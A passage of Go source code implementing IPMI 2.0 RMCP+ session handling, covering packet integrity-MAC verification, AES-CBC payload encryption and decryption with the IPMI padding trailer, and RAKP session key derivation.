		return nil, errors.New("session20: not RMCP+ IPMI")
	}
	ptype := pkt[5]
	encrypted := (ptype & 0x80) != 0
	authed := (ptype & 0x40) != 0
	plen := int(binary.LittleEndian.Uint16(pkt[14:16]))
	if len(pkt) < 16+plen {
		return nil, errors.New("session20: truncated payload")
	}
	body := pkt[16:]
	payload := body[:plen]
	rest := body[plen:]

	if authed {
		macLen := s.integrityMacLen()
		if len(rest) < 2+macLen {
			return nil, errors.New("session20: short auth trailer")
		}
		padLen := int(rest[len(rest)-2-macLen])
		if len(rest) < padLen+2+macLen {
			return nil, errors.New("session20: malformed auth trailer")
		}
		msgNoMac := pkt[:16+plen+len(rest)-macLen]
		expect := s.integrityMac(msgNoMac[4:])
		got := rest[len(rest)-macLen:]
		if !hmac.Equal(expect, got) {
			return nil, errors.New("session20: bad integrity MAC")
		}
		_ = padLen
	}
	if !encrypted {
		return payload, nil
	}
	if s.suite.Conf != ConfAESCBC {
		return nil, fmt.Errorf("session20: unsupported confidentiality algorithm 0x%02x", s.suite.Conf)
	}
	return s.decryptPayload(payload)
}

func (s *Session20) encryptPayload(p []byte) ([]byte, error) {
	key := s.confKey()
	if len(key) < 16 {
		return nil, errors.New("session20: short AES key")
	}
	iv := make([]byte, aes.BlockSize)
	if _, err := rand.Read(iv); err != nil {
		return nil, err
	}
	// IPMI v2 confidentiality trailer is pad bytes + 1-byte pad length.
	padLen := (aes.BlockSize - ((len(p) + 1) % aes.BlockSize)) % aes.BlockSize
	plain := make([]byte, 0, len(p)+padLen+1)
	plain = append(plain, p...)
	for i := 1; i <= padLen; i++ {
		plain = append(plain, byte(i))
	}
	plain = append(plain, byte(padLen))
	blk, err := aes.NewCipher(key[:16])
	if err != nil {
		return nil, err
	}
	ct := make([]byte, len(plain))
	cipher.NewCBCEncrypter(blk, iv).CryptBlocks(ct, plain)
	return append(iv, ct...), nil
}

func (s *Session20) decryptPayload(p []byte) ([]byte, error) {
	if len(p) < aes.BlockSize || (len(p)-aes.BlockSize)%aes.BlockSize != 0 {
		return nil, errors.New("session20: malformed encrypted payload")
	}
	key := s.confKey()
	if len(key) < 16 {
		return nil, errors.New("session20: short AES key")
	}
	iv := p[:aes.BlockSize]
	ct := p[aes.BlockSize:]
	blk, err := aes.NewCipher(key[:16])
	if err != nil {
		return nil, err
	}
	pt := make([]byte, len(ct))
	cipher.NewCBCDecrypter(blk, iv).CryptBlocks(pt, ct)
	if len(pt) < 1 {
		return nil, errors.New("session20: short decrypted payload")
	}
	padLen := int(pt[len(pt)-1])
	if len(pt) < padLen+1 {
		return nil, errors.New("session20: bad decrypted padding")
	}
	return append([]byte(nil), pt[:len(pt)-1-padLen]...), nil
}

func (s *Session20) integrityMac(msg []byte) []byte {
	if s.suite.Integrity == IntegrityNone {
		return nil
	}
	mac := hmacByIntegrityAlgo(s.suite.Integrity, s.k1)
	mac.Write(msg)
	sum := mac.Sum(nil)
	sz := s.integrityMacLen()
	if len(sum) > sz {
		return sum[:sz]
	}
	return sum
}

func (s *Session20) integrityMacLen() int {
	if s.suite.Integrity == IntegrityNone {
		return 0
	}
	switch s.suite.Integrity {
	case IntegrityHMACSHA196:
		return 12
	case IntegrityHMACMD5128, IntegrityMD5128, IntegrityHMACSHA256128:
		return 16
	default:
		return 12
	}
}

func (s *Session20) confKey() []byte {
	if len(s.k2) > 0 {
		return s.k2
	}
	return []byte(s.password)
}

func hmacByIntegrityAlgo(algo byte, key []byte) hash.Hash {
	switch algo {
	case IntegrityHMACSHA196:
		return hmac.New(sha1.New, key)
	case IntegrityHMACMD5128, IntegrityMD5128:
		return hmac.New(md5.New, key)
	case IntegrityHMACSHA256128:
		return hmac.New(sha256.New, key)
	default:
		return hmac.New(sha1.New, key)
	}
}

func deriveSessionKeys(authAlgo byte, password, cRand, bRand []byte, username string) (sik, k1, k2 []byte) {
	return deriveSessionKeysWithRole(authAlgo, password, cRand, bRand, 0x14, username)
}

func deriveSessionKeysWithRole(authAlgo byte, password, cRand, bRand []byte, role byte, username string) (sik, k1, k2 []byte) {
	if authAlgo == RAKPNone {
		return nil, nil, nil
	}
	mac := hmacByAlgo(authAlgo, password)
	mac.Write(cRand)
	mac.Write(bRand)
	mac.Write([]byte{role, byte(len(username))})
	mac.Write([]byte(username))
	sik = mac.Sum(nil)
	// IPMI 2.0 session key expansion uses fixed 20-byte constants for K1/K2.
	// Using hash-length-sized constants breaks interop on SHA-256 suites.
	const kConstLen = 20
	m1 := hmacByAlgo(authAlgo, sik)
	m1.Write(bytes.Repeat([]byte{0x01}, kConstLen))
	k1 = m1.Sum(nil)
	m2 := hmacByAlgo(authAlgo, sik)
	m2.Write(bytes.Repeat([]byte{0x02}, kConstLen))
	k2 = m2.Sum(nil)
	return sik, k1, k2
}
